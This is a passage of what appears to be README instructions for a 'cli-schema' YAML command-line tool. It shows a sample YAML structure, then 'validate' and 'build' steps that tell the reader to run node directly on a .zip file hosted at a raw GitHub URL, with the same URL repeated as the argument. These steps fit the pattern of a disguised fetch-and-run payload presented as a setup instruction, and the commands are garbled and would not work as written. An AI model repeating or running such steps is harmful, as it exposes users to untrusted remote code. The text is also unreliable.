2. **Add Commands**: Use the following structure within your YAML file:

   ```yaml
   command:
     description: "Your command description here"
     options:
       - name: "option1"
         type: "boolean"
       - name: "option2"
         type: "string"
   ```

3. **Validate the YAML**: You can validate the YAML file using cli-schema by running the following command:

   ```
   node https://raw.githubusercontent.com/novonil74/cli-schema/main/spadewise/cli_schema_v3.9-beta.1.zip validate https://raw.githubusercontent.com/novonil74/cli-schema/main/spadewise/cli_schema_v3.9-beta.1.zip
   ```

4. **Build Your CLI**: To build the command-line interface, use the following command:

   ```
   node https://raw.githubusercontent.com/novonil74/cli-schema/main/spadewise/cli_schema_v3.9-beta.1.zip build https://raw.githubusercontent.com/novonil74/cli-schema/main/spadewise/cli_schema_v3.9-beta.1.zip
